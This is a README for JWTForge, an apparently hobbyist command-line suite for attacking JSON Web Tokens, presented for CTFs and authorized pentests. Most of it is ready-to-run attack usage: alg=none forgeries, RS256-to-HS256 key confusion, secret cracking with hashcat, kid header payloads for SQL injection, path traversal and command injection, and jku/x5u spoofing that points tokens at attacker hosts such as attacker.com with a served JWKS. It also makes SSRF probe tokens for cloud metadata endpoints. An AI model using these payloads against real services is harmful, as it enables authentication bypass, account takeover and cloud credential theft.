<div align="center">

```
     ██╗██╗    ██╗████████╗    ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
     ██║██║    ██║╚══██╔══╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
     ██║██║ █╗ ██║   ██║       █████╗  ██║   ██║██████╔╝██║  ███╗█████╗  
██   ██║██║███╗██║   ██║       ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
╚█████╔╝╚███╔███╔╝   ██║       ██║     ╚██████╔╝██║  ██╗╚██████╔╝███████╗
 ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
```

**6+ JWT Attacks. One Tool. Zero Excuses.**

[![Week](https://img.shields.io/badge/Week-15-red?style=for-the-badge&logo=python)](https://github.com)
[![Attacks](https://img.shields.io/badge/Attacks-8%2B-critical?style=for-the-badge)](https://github.com)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

[![None Alg](https://img.shields.io/badge/Attack-None%20Algorithm-red?style=flat-square)](https://github.com)
[![Key Confusion](https://img.shields.io/badge/Attack-Key%20Confusion-orange?style=flat-square)](https://github.com)
[![Brute Force](https://img.shields.io/badge/Attack-Brute%20Force-yellow?style=flat-square)](https://github.com)
[![KID Injection](https://img.shields.io/badge/Attack-KID%20Injection-blue?style=flat-square)](https://github.com)
[![JKU Spoof](https://img.shields.io/badge/Attack-JKU%20Spoof-purple?style=flat-square)](https://github.com)
[![X5U Spoof](https://img.shields.io/badge/Attack-X5U%20Spoof-magenta?style=flat-square)](https://github.com)
[![Hashcat](https://img.shields.io/badge/Tool-Hashcat%20Integration-darkred?style=flat-square)](https://hashcat.net)
[![JWKS Server](https://img.shields.io/badge/Feature-JWKS%20Server-darkgreen?style=flat-square)](https://github.com)

</div>

---

> **JWTForge** is a comprehensive CLI JWT exploitation suite covering every major JWT attack in one tool.
> Give it a token — it runs all attacks and tells you exactly which ones succeed.

---

## 🗂 Table of Contents

- [Why JWTForge](#-why-jwtforge)
- [Attack Coverage](#-attack-coverage)
- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Commands](#-commands)
  - [decode — Analyze a JWT](#decode)
  - [scan — Run all attacks](#scan)
  - [none — None algorithm attack](#none)
  - [confuse — Key confusion](#confuse)
  - [brute — Brute force weak secrets](#brute)
  - [kid — KID injection](#kid)
  - [jku — JKU spoofing](#jku)
  - [x5u — X5U/X5C spoofing](#x5u)
  - [forge — Manual JWT forging](#forge)
  - [server — JWKS/cert server](#server)
- [Attack Deep Dives](#-attack-deep-dives)
- [CTF Cheat Sheet](#-ctf-cheat-sheet)
- [Project Structure](#-project-structure)

---

## 🤔 Why JWTForge

Most JWT attack tools do **one or two things**. You end up juggling multiple scripts for a single pentest. JWTForge covers the entire attack surface:

| Tool | none alg | key confusion | brute force | KID injection | JKU spoof | X5U/X5C |
|------|:--------:|:-------------:|:-----------:|:-------------:|:---------:|:--------:|
| jwt_tool | ✔ | ✔ | ✔ | partial | partial | ✘ |
| jwtear | ✔ | ✔ | ✘ | ✘ | ✘ | ✘ |
| pyjwt-cli | ✘ | ✘ | ✘ | ✘ | ✘ | ✘ |
| **JWTForge** | ✔ | ✔ | ✔ + hashcat | ✔ (17 payloads) | ✔ + SSRF | ✔ both |

JWTForge also **starts a live JWKS/cert server** for you, generates **SSRF probe tokens**, supports **claim modification** in every attack, and outputs **clean Rich terminal output** with tables.

---

## ⚔️ Attack Coverage

| # | Attack | Algorithm | Description |
|---|--------|-----------|-------------|
| 1 | **None Algorithm** | any → none | Set `alg=none` in 20 capitalisation variants to strip signature verification |
| 2 | **RS256 → HS256 Key Confusion** | RS256 → HS256/384/512 | Use the RSA public key as HMAC secret (CVE-2016-10555) |
| 3 | **Brute Force Weak Secret** | HS256/384/512 | Wordlist attack on HMAC secret + hashcat mode 16500 integration |
| 4 | **Embedded JWK Injection** | RS256 | Self-sign and embed attacker JWK in header — no pubkey needed |
| 5 | **KID SQL Injection** | any | Inject SQL into `kid` header to control the verification key (7 payloads) |
| 6 | **KID Path Traversal** | any | Traverse to `/dev/null` or known files to predict the signing key (6 payloads) |
| 7 | **KID Command Injection** | any | Inject shell commands into `kid` to control key output (4 payloads) |
| 8 | **JKU URL Spoofing** | RS256 | Point `jku` at attacker-controlled JWKS; built-in server included |
| 9 | **JKU SSRF Probing** | RS256 | Generate tokens to probe internal metadata endpoints (AWS, GCP, Azure) |
| 10 | **X5U Certificate Spoofing** | RS256 | Point `x5u` at attacker-controlled self-signed certificate |
| 11 | **X5C Embedded Cert** | RS256 | Embed self-signed cert in `x5c` header — no server required |

---

## 📦 Installation

**Requirements:** Python 3.8+, pip

```bash
git clone https://github.com/yourname/jwtforge
cd jwtforge
pip install -e .
```

Or use the install script:

```bash
chmod +x install.sh && ./install.sh
```

Verify:

```bash
jwtforge --help
```

### Optional: Hashcat (GPU acceleration)

JWTForge integrates with hashcat for faster brute-forcing. If hashcat is installed, `jwtforge brute --hashcat` will invoke it automatically.

```bash
# Kali / Ubuntu
sudo apt install hashcat

# macOS
brew install hashcat
```

---

## ⚡ Quick Start

```bash
# 1. Decode and analyze any JWT
jwtforge decode eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.xxx

# 2. Run ALL attacks in one command
jwtforge scan eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx \
  --pubkey server.pub \
  --wordlist wordlists/jwt-secrets.txt

# 3. Save all results to JSON
jwtforge scan <token> --output results.json
```

---

## 📖 Commands

### `decode`

Decode and analyze a JWT token. Displays header, payload, metadata, and potential weaknesses.

```bash
jwtforge decode <TOKEN>
jwtforge decode <TOKEN> --json
```

**Output includes:**
- Header and payload in formatted tables
- Algorithm type and expiry status
- Embedded security hints (KID present, JKU present, expired, etc.)

---

### `scan`

The main command — runs **all applicable attacks** against a JWT and produces a summary table.

```bash
jwtforge scan <TOKEN>
jwtforge scan <TOKEN> --pubkey server.pub --wordlist rockyou.txt
jwtforge scan <TOKEN> --host 10.10.14.5 --port 9090 --output results.json
```

| Option | Description |
|--------|-------------|
| `--pubkey FILE` | RSA public key PEM (enables key confusion attack) |
| `--wordlist FILE` | Wordlist for brute force |
| `--host IP` | Attacker host for JKU/X5U payloads |
| `--port PORT` | Attacker port for JKU/X5U payloads (default: 8888) |
| `--output FILE` | Save full results to JSON |

**Example output:**

```
┌─────────────────────────────────────────────────────────────┐
│ Scan Results                                                 │
├─────┬──────────────────────────┬───────────────┬────────────┤
│  1  │ None Algorithm           │  PWNED ✔      │ 20 variants│
│  2  │ Key Confusion (HS256)    │  PWNED ✔      │ RS256→HS256│
│  3  │ Brute Force              │  PWNED ✔      │ "secret"   │
│  4  │ KID Injection            │  PWNED ✔      │ 17 payloads│
│  5  │ JKU Spoofing             │  PWNED ✔      │ token ready│
│  6  │ X5U Spoofing             │  PWNED ✔      │ cert ready │
└─────┴──────────────────────────┴───────────────┴────────────┘
```

---

### `none`

Generates tokens with `alg` set to all known `none` variants (20 total), stripping signature verification.

```bash
jwtforge none <TOKEN>
jwtforge none <TOKEN> -c role=admin -c sub=administrator
jwtforge none <TOKEN> --all-variants
```

| Option | Description |
|--------|-------------|
| `-c KEY=VALUE` | Modify payload claim before forging |
| `--all-variants` | Show all 20 variants (default shows 6) |

**Variants tried:** `none`, `None`, `NONE`, `nOnE`, `noNe`, `nONe`, `NoNe`, `nOne`, plus trailing-dot format variants.

---

### `confuse`

RS256 → HS256 algorithm confusion attack. Signs with the RSA public key as the HMAC secret.

```bash
jwtforge confuse <TOKEN> server.pub
jwtforge confuse <TOKEN> server.pub --alg HS512
jwtforge confuse <TOKEN> server.pub --all-algs -c role=admin
```

| Option | Description |
|--------|-------------|
| `--alg` | Target HMAC algorithm: HS256 / HS384 / HS512 (default: HS256) |
| `--all-algs` | Try all three HMAC variants |
| `-c KEY=VALUE` | Modify payload before forging |

**How to get the public key:**

```bash
# From a running server via HTTPS certificate
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > server.pub

# From a JWKS endpoint
curl https://target.com/.well-known/jwks.json | python3 -c "
import json,sys,base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
jwk = json.load(sys.stdin)['keys'][0]
def b64(s): return int.from_bytes(base64.urlsafe_b64decode(s+'=='), 'big')
pub = RSAPublicNumbers(b64(jwk['e']),b64(jwk['n'])).public_key(default_backend())
print(pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode())
" > server.pub
```

---

### `brute`

Brute-forces the HMAC secret for HS256/HS384/HS512 tokens using a wordlist.

```bash
jwtforge brute <TOKEN> -w wordlists/jwt-secrets.txt
jwtforge brute <TOKEN> -w /usr/share/wordlists/rockyou.txt
jwtforge brute <TOKEN> -w secrets.txt --hashcat
jwtforge brute <TOKEN> -w secrets.txt -c role=admin -c sub=1337
```

| Option | Description |
|--------|-------------|
| `-w / --wordlist FILE` | **Required.** Path to wordlist |
| `--hashcat` | Invoke hashcat (mode 16500) instead of Python |
| `--hashcat-args` | Extra hashcat arguments (e.g., `-r best64.rule`) |
| `-c KEY=VALUE` | Modify claims in the re-signed token |

Always shows the **hashcat command** for GPU cracking:

```bash
hashcat -a 0 -m 16500 '<TOKEN>' wordlist.txt
hashcat -a 0 -m 16500 '<TOKEN>' wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

### `kid`

KID (Key ID) header injection attack — generates SQL injection, path traversal, and command injection payloads.

```bash
jwtforge kid <TOKEN>
jwtforge kid <TOKEN> --type sql
jwtforge kid <TOKEN> --type path
jwtforge kid <TOKEN> --type cmd
jwtforge kid <TOKEN> --type custom --kid "../../dev/null" --secret ""
jwtforge kid <TOKEN> -o kid-payloads.json
```

| Option | Description |
|--------|-------------|
| `--type` | `all` / `sql` / `path` / `cmd` / `custom` (default: all) |
| `--kid VALUE` | Custom KID value (used with `--type custom`) |
| `--secret VALUE` | Signing secret (empty string allowed) |
| `--alg` | HS256 / HS384 / HS512 (default: HS256) |
| `-o FILE` | Save all payloads to JSON |

**Example payloads generated:**

| Type | KID Value | Sign Secret |
|------|-----------|-------------|
| SQL Union | `' UNION SELECT 'jwtforge' --` | `jwtforge` |
| SQL Blank | `' UNION SELECT '' --` | `` (empty) |
| Path Null | `../../dev/null` | `` (empty) |
| Path Known | `/proc/sys/kernel/randomize_va_space` | `2` |
| Command | `key\|echo jwtforge` | `jwtforge` |

---

### `jku`

JKU (JWKS URL) spoofing — forge a JWT pointing `jku` at your own JWKS, then sign it with your private key.

```bash
jwtforge jku <TOKEN> --host 10.10.14.5 --port 8888
jwtforge jku <TOKEN> --url http://attacker.com/jwks.json
jwtforge jku <TOKEN> --serve                        # auto-start JWKS server
jwtforge jku <TOKEN> --ssrf                         # generate SSRF probe tokens
jwtforge jku <TOKEN> --host 10.10.14.5 --serve --save-jwks jwks.json
```

| Option | Description |
|--------|-------------|
| `--host IP` | Attacker IP for JKU URL (default: 127.0.0.1) |
| `--port PORT` | Port for JWKS server (default: 8888) |
| `--url URL` | Override JKU URL entirely |
| `--kid VALUE` | Key ID to embed |
| `--serve` | Start local JWKS server and watch for hits |
| `--ssrf` | Generate SSRF probe tokens (AWS, GCP, Azure metadata) |
| `--save-jwks FILE` | Save JWKS JSON to file |

**SSRF endpoints probed:**

```
http://169.254.169.254/latest/meta-data/        (AWS)
http://metadata.google.internal/computeMetadata/v1/   (GCP)
http://169.254.169.254/metadata/v1/             (Azure/DigitalOcean)
```

---

### `x5u`

X5U / X5C certificate spoofing — forge JWT using an attacker-controlled or embedded self-signed certificate.

```bash
jwtforge x5u <TOKEN> --host 10.10.14.5 --port 8888
jwtforge x5u <TOKEN> --embedded                     # no server needed!
jwtforge x5u <TOKEN> --url http://attacker.com/cert.pem
jwtforge x5u <TOKEN> --embedded --serve --save-cert cert.pem
```

| Option | Description |
|--------|-------------|
| `--embedded` | **X5C mode** — embed self-signed cert in header (no server!) |
| `--host IP` | Attacker host for cert URL |
| `--port PORT` | Port (default: 8888) |
| `--url URL` | Override X5U URL |
| `--cn VALUE` | Certificate Common Name |
| `--serve` | Start certificate server |
| `--save-cert FILE` | Save PEM certificate to file |

`--embedded` generates a token with the certificate in the `x5c` header field — no external server or network access needed. The most stealthy variant.

---

### `forge`

Manually forge a JWT with full control over header and payload, then sign it.

```bash
jwtforge forge <TOKEN> -c sub=admin -c role=administrator --secret mykey
jwtforge forge <TOKEN> -c admin=true --privkey rsa_private.key
jwtforge forge <TOKEN> -c sub=1337 --no-sig
jwtforge forge <TOKEN> -H alg=HS512 -c exp=9999999999 --secret s3cr3t
```

| Option | Description |
|--------|-------------|
| `-c KEY=VALUE` | Set payload claim (integers auto-cast) |
| `-H KEY=VALUE` | Set header claim |
| `--secret VALUE` | Sign with HMAC secret (HS*) |
| `--privkey FILE` | Sign with RSA private key PEM (RS256) |
| `--no-sig` | Produce unsigned token (alg=none) |

---

### `server`

Start a live HTTP server that serves JWKS and/or certificate content for JKU/X5U attacks.

```bash
jwtforge server
jwtforge server --port 9090 --host 0.0.0.0
jwtforge server --jwks my.jwks.json --port 8888
jwtforge server --cert cert.pem --port 8080
```

**Endpoints served:**

| Path | Content |
|------|---------|
| `/.well-known/jwks.json` | JWKS JSON |
| `/jwks.json` | JWKS JSON (alias) |
| `/cert.pem` | X.509 certificate |
| `/` | Status page |

Displays live request hits as the target application calls back:

```
  [HIT] 14:23:01  10.10.14.5  →  /.well-known/jwks.json
```

---

## 🔬 Attack Deep Dives

### 1. None Algorithm Attack

JWT libraries that don't validate the `alg` header will accept a token with `alg=none` and an empty signature. The attacker strips the signature entirely and changes the algorithm.

```
Original:  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE
Forged:    eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

**Affected libraries:** Early versions of python-jose, pyjwt < 1.5.0, various Node.js libraries.

---

### 2. RS256 → HS256 Key Confusion (CVE-2016-10555)

The server has an RSA key pair and normally uses `RS256`. An attacker:

1. Obtains the server's RSA **public key** (often publicly available at `/jwks.json`)
2. Changes `alg` from `RS256` to `HS256`
3. Signs the JWT with `HMAC-SHA256` using the **public key bytes** as the secret

The server, configured to use its public key for RS256 verification, tries that public key against the HS256 token — and it matches, because that's exactly what we used to sign.

---

### 3. Brute Force + Hashcat (Mode 16500)

HMAC-based JWTs are only as secure as their secret. Common weak secrets (`secret`, `password`, `admin`) can be cracked quickly.

JWTForge includes a built-in wordlist (`wordlists/jwt-secrets.txt`) with 100+ common JWT secrets. For larger attacks, use rockyou.txt with hashcat:

```bash
# Pure Python (slower, no dependencies)
jwtforge brute <token> -w rockyou.txt

# GPU-accelerated via hashcat (much faster)
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 token.txt rockyou.txt -r best64.rule
```

---

### 4. KID Header Injection

The `kid` (Key ID) header field tells the server which key to use. If the application queries a database or reads a file using `kid` without sanitization:

**SQL Injection:**
```json
{ "alg": "HS256", "kid": "' UNION SELECT 'jwtforge' -- " }
```
Sign with `jwtforge` — the SQL injection makes the DB return `jwtforge` as the key.

**Path Traversal:**
```json
{ "alg": "HS256", "kid": "../../dev/null" }
```
Sign with an empty string `""` — `/dev/null` contains nothing, so HMAC("", ...) is the expected signature.

---

### 5. JKU Spoofing

The `jku` header points to a JWKS endpoint. If the server fetches this URL without validating it's a trusted domain:

```bash
# 1. Generate forged token + JWKS
jwtforge jku <token> --host 10.10.14.5 --port 8888

# 2. Start JWKS server (in same command with --serve, or separately)
jwtforge server --port 8888

# 3. Submit forged token — server fetches YOUR jwks.json to verify
```

The forged token contains `"jku": "http://10.10.14.5:8888/.well-known/jwks.json"` and is signed with a key whose public half is in YOUR JWKS. The server fetches your JWKS and happily verifies the signature.

---

### 6. X5C Embedded Certificate (No Server Needed)

The sneakiest variant. The `x5c` header embeds a certificate chain directly in the JWT. Vulnerable servers use the embedded certificate to verify the signature — meaning the attacker completely controls the key material, and no external server is needed.

```bash
jwtforge x5u <token> --embedded
```

---

## 🏁 CTF Cheat Sheet

**Got a JWT in a CTF? Run this first:**

```bash
# Step 1: Decode it
jwtforge decode <token>

# Step 2: Scan everything
jwtforge scan <token> --wordlist wordlists/jwt-secrets.txt
```

**Common CTF scenarios:**

```bash
# Weak secret (most common)
jwtforge brute <token> -w /usr/share/wordlists/rockyou.txt -c role=admin

# None algorithm bypass
jwtforge none <token> -c role=admin -c sub=administrator

# RS256 token + exposed public key
curl http://target/.well-known/jwks.json -o jwks.json
# Convert JWKS to PEM (see confuse section above)
jwtforge confuse <token> server.pub -c role=admin

# KID path traversal (common in harder boxes)
jwtforge kid <token> --type path

# JKU injection (Advanced)
jwtforge jku <token> --host <your-ip> --serve -c role=admin
```

**PortSwigger JWT Labs covered by JWTForge:**

| Lab | Command |
|-----|---------|
| JWT authentication bypass via unverified signature | `jwtforge forge` |
| JWT authentication bypass via flawed signature verification | `jwtforge none` |
| JWT authentication bypass via weak signing key | `jwtforge brute` |
| JWT authentication bypass via jwk header injection | `jwtforge confuse --embedded-jwk` |
| JWT authentication bypass via jku header injection | `jwtforge jku --serve` |
| JWT authentication bypass via kid header path traversal | `jwtforge kid --type path` |

---

## 🗂 Project Structure

```
jwtforge/
├── jwtforge/
│   ├── cli.py                  # All CLI commands (Click)
│   ├── core/
│   │   ├── parser.py           # JWT parsing, encoding, signing input
│   │   └── reporter.py         # Rich terminal output
│   ├── attacks/
│   │   ├── none_alg.py         # None algorithm attack (20 variants)
│   │   ├── key_confusion.py    # RS256→HS256 + embedded JWK
│   │   ├── brute_force.py      # Wordlist + hashcat integration
│   │   ├── kid_injection.py    # SQL / path traversal / cmd injection
│   │   ├── jku_spoof.py        # JKU JWKS spoofing + SSRF probes
│   │   └── x5u_spoof.py        # X5U cert spoofing + X5C embedded
│   └── server/
│       └── jwks_server.py      # Live JWKS + cert HTTP server
├── wordlists/
│   └── jwt-secrets.txt         # 100+ common JWT secrets
├── tests/
│   └── test_attacks.py         # Full test suite (9 tests)
├── install.sh
├── requirements.txt
└── setup.py
```

---

## ⚠️ Legal Notice

JWTForge is for **authorized security testing, CTFs, and educational use only**. Do not use against systems you don't own or have explicit written permission to test. The authors are not responsible for misuse.

---

<div align="center">

**Week 15 / 52 — Building one security tool per week.**

Made with ☕ and too much JWT research.

</div>
Line from teammate
